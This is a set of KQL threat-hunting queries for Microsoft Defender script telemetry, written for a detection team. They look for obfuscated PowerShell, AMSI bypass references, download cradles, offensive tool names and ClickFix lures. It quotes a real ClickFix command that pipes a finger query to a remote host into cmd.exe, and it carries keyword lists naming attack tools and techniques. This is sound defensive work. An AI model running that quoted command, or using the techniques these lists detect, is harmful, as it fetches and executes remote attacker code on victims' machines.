# DeviceCustomScriptEvents threat hunting queries

Eleven KQL hunts against `DeviceCustomScriptEvents` (the AmsiScriptContent custom
data collection table), built for the signature and DFIR team to triage what
threat actors hide inside script content: embedded IOCs and common PowerShell
obfuscation TTPs. Every query below was validated live against real
telemetry with a 7 day data window before being saved.

## 1. Embedded IPv4 address

```kql
// Extracts every IPv4 looking string from script content, a
// common spot for a hardcoded callback or staging IP. Expect noise from
// version strings like 1.0.0.0; triage public, non-reserved IPs first.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent)
| extend IPMatches = extract_all(@'((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))', ScriptContent)
| where array_length(IPMatches) > 0
| mv-expand IP = IPMatches to typeof(string)
| where IP !startswith '127.' and IP != '0.0.0.0'
| summarize Devices = dcount(DeviceName), Events = count(), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by IP, InitiatingProcessFileName
| order by Events desc
| take 10000
```

What it does and why: pulls every IPv4 looking string out of the raw script
body. Attackers often hardcode a callback or staging server IP directly in a
dropped script to avoid relying on DNS, which is easier to sinkhole or block.
Known noise: assembly and module version strings such as `1.0.0.0` or
`3.1.0.0` also match the IPv4 pattern and will show up, treat those as low
priority unless the device or process context looks wrong.

## 2. Embedded URL or domain

```kql
// Extracts every http or https URL embedded in script content.
// Surfaces staging servers, exfil endpoints, or download cradle targets.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent)
| extend URLMatches = extract_all(@'(https?://[a-zA-Z0-9\.\-_/:%?=&#]+)', ScriptContent)
| where array_length(URLMatches) > 0
| mv-expand Url = URLMatches to typeof(string)
| summarize Devices = dcount(DeviceName), Events = count(), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by Url, InitiatingProcessFileName
| order by Events desc
| take 10000
```

What it does and why: same idea as the IP hunt but for http and https links.
Surfaces staging servers, exfil endpoints, or download cradle targets that
were pasted straight into a script instead of being computed at runtime.

## 3. Long base64 blocks

```kql
// Flags scripts containing a contiguous base64 looking run of
// 80 plus characters, rare in legitimate scripts, common in staged payloads.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent)
| extend Base64Blocks = extract_all(@'([A-Za-z0-9+/]{80,}={0,2})', ScriptContent)
| where array_length(Base64Blocks) > 0
| mv-expand B64 = Base64Blocks to typeof(string)
| extend B64Length = strlen(B64)
| summarize Devices = dcount(DeviceName), Events = count(), MaxBlockLength = max(B64Length), SampleBlock = any(B64) by InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Events desc
| take 10000
```

What it does and why: flags any contiguous base64 looking run of 80 or more
characters inside the script body. Legitimate scripts rarely carry long
base64 blocks outside of certificate or hash material, while obfuscated or
staged second stage payloads frequently do.

## 4. -EncodedCommand extraction and decode

```kql
// Extracts and decodes the base64 payload from a PowerShell
// -EncodedCommand flag. Interleaved nulls in the decoded text are expected.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where InitiatingProcessCommandLine contains '-EncodedCommand'
| extend EncodedPortion = extract(@'(?i)encodedcommand\s+([A-Za-z0-9+/=]{20,})', 1, InitiatingProcessCommandLine)
| where isnotempty(EncodedPortion)
| extend DecodedAttempt = base64_decode_tostring(EncodedPortion)
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, EncodedPortion, DecodedAttempt, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: pulls the base64 payload out of a PowerShell
`-EncodedCommand` invocation and decodes it inline so an analyst does not
have to decode it by hand. PowerShell encodes this parameter as UTF-16LE, so
the decoded text shows interleaved null bytes when read as plain UTF-8, that
is expected, not a query defect.

## 5. Char code or char array string rebuild

```kql
// Flags strings rebuilt from chained [char] casts or a
// [char[]] array, a strong sign of automated obfuscation tooling.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent)
| where ScriptContent matches regex @'(\[char\]\s*(0x[0-9a-fA-F]+|\d{2,3})\s*){5,}'
    or (ScriptContent has '-join' and ScriptContent has '[char[]]')
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, ScriptContent, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: detects strings rebuilt one character at a time from
`[char]` casts of decimal or hex codes, or a `[char[]]` array joined back
into text. Five or more chained casts in a row is a strong signal of
automated obfuscation tooling rather than hand written code.

## 6. Heavy string concatenation obfuscation

```kql
// Flags scripts with 8 or more + operators, a sign of
// Invoke-Obfuscation style keyword splitting to dodge literal matching.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent)
| extend ConcatHits = countof(ScriptContent, '+')
| where ConcatHits >= 8
| project Timestamp, DeviceName, InitiatingProcessFileName, ConcatHits, RuleName
| order by ConcatHits desc
| take 10000
```

What it does and why: obfuscation tools such as Invoke-Obfuscation commonly
split a sensitive keyword like Invoke-Expression into many short quoted
fragments joined with the `+` operator, to defeat simple keyword matching. A
high raw count of `+` operators in one script is a cheap, reliable heuristic
for this pattern.

## 7. Compression based payload obfuscation

```kql
// Flags scripts that decompress a Gzip or Deflate stream
// after a base64 decode, a common second stage loader pattern.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent)
| where ScriptContent has_any ('IO.Compression.GzipStream', 'IO.Compression.DeflateStream', 'System.IO.Compression', 'FromBase64String')
    and ScriptContent has_any ('MemoryStream', 'Convert]::FromBase64String')
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: catches scripts that decompress an embedded Gzip or
Deflate stream after a base64 decode, a common second stage loader pattern
used to shrink and obscure a larger payload before executing it in memory.

## 8. AMSI bypass indicators

```kql
// Flags references to internal AMSI fields or methods
// attackers patch to disable malware scanning. Any hit warrants escalation.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent)
| where ScriptContent has_any ('amsiInitFailed', 'AmsiUtils', 'AmsiScanBuffer', 'amsiContext', 'AmsiSession', 'System.Management.Automation.AmsiUtils')
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: looks for references to the internal AMSI fields and
methods that attackers patch or flip to disable the Antimalware Scan
Interface before running the rest of a malicious script.

## 9. Download cradle indicators

```kql
// Flags the classic download and execute pattern, a
// WebClient or Invoke-WebRequest call feeding straight into IEX.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent)
| where ScriptContent has_any ('Net.WebClient', 'DownloadString', 'DownloadFile', 'Invoke-WebRequest', 'iwr ', 'Start-BitsTransfer')
    and ScriptContent has_any ('IEX', 'Invoke-Expression', 'iex ')
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: detects the classic download and execute pattern
where a script pulls remote content and feeds it straight into
Invoke-Expression without ever writing the payload to disk.

## 10. Reflection and in-memory execution indicators

```kql
// Flags .NET reflection and unmanaged memory APIs used to
// run a payload entirely in memory without dropping a file to disk.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent)
| where ScriptContent has_any ('Reflection.Assembly', '[Reflection.Assembly]', 'Assembly]::Load', 'Marshal]::', 'VirtualAlloc', 'CreateThread', 'WriteProcessMemory', 'GetDelegateForFunctionPointer')
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: flags use of .NET reflection and unmanaged memory
APIs commonly used to load and run a payload entirely in memory, for
example a reflective PE loader or shellcode runner, without ever dropping
an executable to disk.

## 11. Known offensive tooling keywords

```kql
// Direct keyword match for well known offensive tool names.
// Coarse and high confidence, but attackers can rename or encode strings.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent)
| where ScriptContent has_any ('Invoke-Mimikatz', 'mimikatz', 'Invoke-PowerShellTcp', 'PowerSploit', 'Invoke-Shellcode', 'Invoke-ReflectivePEInjection', 'Invoke-BloodHound', 'Invoke-Kerberoast', 'Rubeus', 'Invoke-DCSync', 'BypassAmsi', 'SharpHound')
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: a direct keyword tripwire for well known post
exploitation and credential access tool names that sometimes appear
unmodified in dropped scripts. This is a coarse, high confidence check, not
a substitute for the obfuscation hunts above, since a competent attacker
renames or encodes these strings.

## 12. ClickFix LOLBin download, execute, and evasion combo (InitiatingProcessCommandLine)

Source: adapted from Microsoft Threat Intelligence, [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/), Microsoft Security Blog, August 21 2025.

```kql
// Flags a command line combining a LOLBin, a download or
// execute primitive, and an evasion flag, the typical ClickFix construction.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(InitiatingProcessCommandLine)
| where InitiatingProcessCommandLine has_any ('powershell', 'pwsh', 'mshta', 'cmd.exe', 'curl', 'wscript', 'cscript', 'msiexec', 'forfiles', 'bitsadmin', 'rundll32')
| where InitiatingProcessCommandLine has_any ('DownloadString', 'DownloadFile', 'IEX', 'Invoke-Expression', 'iwr ', 'Invoke-WebRequest', 'irm ', 'Invoke-RestMethod', 'FromBase64String', 'System.IO.Compression', '-useb', '-UserAgent')
| where InitiatingProcessCommandLine has_any ('-w hidden', '-W Hidden', '-windowstyle hidden', '-WindowStyle Hidden', '-enc', '-EncodedCommand', '-eC ', '^', '[char]', '[scriptblock]')
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: a ClickFix lure tricks a user into pasting a command
into the Windows Run dialog or a terminal, and that pasted command becomes
the InitiatingProcessCommandLine that spawned the custom script probe
captured in this table, so there is no need to reach into legacy
DeviceRegistryEvents RunMRU data or DeviceProcessEvents. This flags command
lines combining a living off the land binary, a download or execute
primitive, and a defense evasion flag, the three part combo the blog
describes as typical ClickFix command construction. Validation note: the
base LOLBin filter alone matched a large number of rows in the same
window, confirming the table and fields resolve correctly. The full three
part combo returned 0 rows, a true negative when collected command lines
are short wrapper invocations that call a .ps1 file by path rather than
embedding the download and execute logic inline.

## 13. ClickFix LOLBin download, execute, and evasion combo (ScriptContent)

Source: adapted from Microsoft Threat Intelligence, [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/), Microsoft Security Blog, August 21 2025.

```kql
// Same LOLBin, download, and evasion combo as the command
// line variant, applied to ScriptContent; corroborate before escalating.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent)
| where ScriptContent has_any ('powershell', 'mshta', 'cmd.exe', 'curl', 'wscript', 'cscript', 'msiexec', 'forfiles', 'bitsadmin', 'rundll32')
| where ScriptContent has_any ('DownloadString', 'DownloadFile', 'IEX', 'Invoke-Expression', 'iwr ', 'Invoke-WebRequest', 'irm ', 'Invoke-RestMethod', 'FromBase64String', 'System.IO.Compression', '-useb', '-UserAgent')
| where ScriptContent has_any ('-w hidden', '-W Hidden', '-windowstyle hidden', '-WindowStyle Hidden', '-enc', '-EncodedCommand', '-eC ', '[char]', '[scriptblock]')
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, ScriptContent, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: a companion to the command line combo above. Some
ClickFix chains paste a short launcher on the command line that in turn
runs a larger embedded script, so the real download, execute, and evasion
combo only shows up in the captured ScriptContent body. This applies the
same three part combo logic directly to ScriptContent. The bare caret (^)
was deliberately dropped from the evasion flag list here, unlike the
command line version, because PowerShell script bodies routinely use a
literal caret inside negated regex character classes such as
`[^\/:*?"<>|\r\n]`, which produced a confirmed false positive during
validation. Validation note: this hunt returned real rows, including the
Microsoft Defender for Cloud Servers extension installer script and an MDE
product metadata collection script, both large legitimate multi-purpose
scripts that happen to reference several of the combo terms across
thousands of lines. Treat ScriptContent combo hits as lower fidelity than
the command line variant and corroborate with the fake verification phrase
hunt or an unusual network destination before escalating.

## 14. ClickFix fake CAPTCHA or verification phrase in script content

Source: adapted from Microsoft Threat Intelligence, [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/), Microsoft Security Blog, August 21 2025. Phrase list and InitiatingProcessCommandLine coverage extended using a real in-the-wild ClickFix sample, see below.

```kql
// Flags fake CAPTCHA or verification wording paired with an
// execution primitive, a ClickFix clipboard lure hallmark.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent) or isnotempty(InitiatingProcessCommandLine)
| where (ScriptContent has_any ('I am not a robot', 'Verification ID', 'verification ID', 'CAPTCHA', 'Captcha', 'Human verification', 'human verification', 'Verify you are human', 'verify you are human', 'Cloud identificator', 'Press Win', 'Windows+R', 'Win+R')
        and ScriptContent has_any ('iex', 'IEX', 'Invoke-Expression', 'powershell', 'mshta', 'curl', 'DownloadString', 'FromBase64String', 'finger'))
    or (InitiatingProcessCommandLine has_any ('I am not a robot', 'Verification ID', 'verification ID', 'CAPTCHA', 'Captcha', 'Human verification', 'human verification', 'Verify you are human', 'verify you are human', 'Cloud identificator', 'Press Win', 'Windows+R', 'Win+R')
        and InitiatingProcessCommandLine has_any ('iex', 'IEX', 'Invoke-Expression', 'powershell', 'mshta', 'curl', 'DownloadString', 'FromBase64String', 'finger'))
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine, ScriptContent, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: ClickFix landing pages decorate the clipboard payload
with fake human verification text, such as a checkmark plus "I am not a
robot", a bogus "Verification ID", or phrases like "Human verification" or
"Cloud identificator", so the pasted command looks like normal CAPTCHA
output rather than code. If that pasted text is ultimately captured as a
script body, it is an extremely high fidelity signal, legitimate admin
scripts essentially never contain this wording. Requiring an execution
primitive alongside the phrase filters out unrelated documentation or help
text. Validation note: the phrase and combo logic was first confirmed
against a synthetic literal string, then confirmed a second time against
the exact phrasing used in a real in-the-wild ClickFix command, "Verify
you are human--press ENTER" alongside powershell and the finger command.
That real sample is why the phrase list now includes "Verify you are
human" and the combo list includes "finger", and why this checks
InitiatingProcessCommandLine as well as ScriptContent, since a blocked
ClickFix attempt may never reach the point of being captured as script
content at all.

## 15. ClickFix caret de-obfuscation and EncodedCommand decode

Source: adapted from Microsoft Threat Intelligence, [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/), Microsoft Security Blog, August 21 2025 (Figure 28 describes LOLBin stacking and caret escape obfuscation, and the blog's own published hunting query uses a regex built around scrambled or caret-split spellings of the EncodedCommand flag).

```kql
// Strips cmd.exe caret escape obfuscation, then extracts and
// decodes any revealed -EncodedCommand payload hiding underneath.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(InitiatingProcessCommandLine)
| where InitiatingProcessCommandLine has '^'
| extend Deobfuscated = replace_string(InitiatingProcessCommandLine, '^', '')
| extend EncodedPortion = extract(@'(?i)-e[a-z]*\s+([A-Za-z0-9+/=]{20,})', 1, Deobfuscated)
| extend DecodedCommand = iif(isnotempty(EncodedPortion), base64_decode_tostring(EncodedPortion), '')
| where isnotempty(EncodedPortion)
    or Deobfuscated has_any ('DownloadString', 'DownloadFile', 'IEX', 'Invoke-Expression', 'iwr ', 'Invoke-WebRequest', 'irm ', 'Invoke-RestMethod', 'FromBase64String')
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, Deobfuscated, EncodedPortion, DecodedCommand, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: this is the hunt in the set that actively reverses an
obfuscation trick rather than just keyword matching around it. cmd.exe
treats a caret before any character as an escape that is silently removed
before the command runs, so an attacker can sprinkle carets almost
anywhere in a command line to defeat literal string and simple regex
matching while the pasted command still executes exactly as intended. This
hunt requires a literal caret to be present on the command line (unusual
on its own), strips every caret to recover the real text, then looks for
an obfuscated EncodedCommand style flag, whether typed as -e, -en, -enc,
or the full spelling, followed by a base64 blob, decodes that blob, and
separately flags a download or execute primitive that only becomes
visible once the carets are removed. Validation note: the full chain was
proven with a synthetic caret-split payload
(`powershell.exe -e^n^c JABwACAAPQAgAEcAZQB0...`), where the caret strip,
flag extraction, and base64 decode correctly reproduced the real hidden
command `$p = Get-MpPreference;`. The query returns 0 rows when no
command lines contain a literal caret, a true negative, not a broken
query.

## 16. ClickFix split-flag string concatenation

Source: pattern confirmed against a real in-the-wild ClickFix command that
used `('-Windo' + 'wStyle') ('hid' + 'den')` to split `-WindowStyle` and
`hidden` into two quoted fragments joined with `+`.

```kql
// Flags a flag or cmdlet name split into two quoted fragments
// joined with +, catching obfuscation the high-threshold concat hunt misses.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent) or isnotempty(InitiatingProcessCommandLine)
| where (ScriptContent matches regex @'\(\s*''[\-A-Za-z]{2,}''\s*\+\s*''[\-A-Za-z]{2,}''\s*\)'
        or ScriptContent matches regex @'\(\s*"[\-A-Za-z]{2,}"\s*\+\s*"[\-A-Za-z]{2,}"\s*\)')
    or (InitiatingProcessCommandLine matches regex @'\(\s*''[\-A-Za-z]{2,}''\s*\+\s*''[\-A-Za-z]{2,}''\s*\)'
        or InitiatingProcessCommandLine matches regex @'\(\s*"[\-A-Za-z]{2,}"\s*\+\s*"[\-A-Za-z]{2,}"\s*\)')
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ScriptContent, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: the existing heavy concatenation hunt (`ConcatHits
>= 8`) missed this real sample entirely, it only has two `+` operators
total, well under that threshold. This hunt instead catches the specific
micro-pattern of a single quoted fragment, plus operator, second quoted
fragment, inside parentheses, regardless of how many times it repeats, a
lower threshold and more targeted companion aimed exactly at flag or
cmdlet name fragmentation used to dodge literal keyword matching.
Validation note: the regex was confirmed with `print` against the literal
fragment `('-Windo' + 'wStyle')` shown above, and returns 0 rows when no
split-flag pattern is present, a clean result.

## 17. ClickFix finger protocol abuse

Source: pattern confirmed against the same real detection, whose command
line was
`"cmd.exe" /c start "" /min powershell -c "& powershell ('-Windo' + 'wStyle') ('hid' + 'den') -c finger mag@finger.captchamag.com | C:\WINDOWS\system32\cmd.exe"`.

```kql
// Flags finger.exe used with a user@host argument, a covert
// retrieval channel over an unmonitored port that ClickFix campaigns abuse.
DeviceCustomScriptEvents
| where Timestamp > ago(7d)
| where isnotempty(ScriptContent) or isnotempty(InitiatingProcessCommandLine)
| extend FingerMatchScript = extract(@'(?i)\bfinger\s+[^\s]+@[^\s]+', 0, ScriptContent)
| extend FingerMatchCmdLine = extract(@'(?i)\bfinger\s+[^\s]+@[^\s]+', 0, InitiatingProcessCommandLine)
| where isnotempty(FingerMatchScript) or isnotempty(FingerMatchCmdLine)
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FingerMatchCmdLine, FingerMatchScript, InitiatingProcessCommandLine, RuleName
| order by Timestamp desc
| take 10000
```

What it does and why: finger.exe is a living off the land binary that
performs a lookup against a remote finger server on TCP port 79, a
protocol rarely monitored or blocked by modern network controls. Threat
actors abuse it as a covert retrieval channel, piping the response of a
finger query shaped like `user@attacker-domain` straight into cmd.exe or
powershell for execution. None of the other hunts in this set look for
finger specifically, this closes that gap. Validation note: the regex was
confirmed with `print` against the literal command text above, correctly
isolating `finger mag@finger.captchamag.com`, and returns 0 rows when no
finger-based retrieval pattern is present, a clean result.

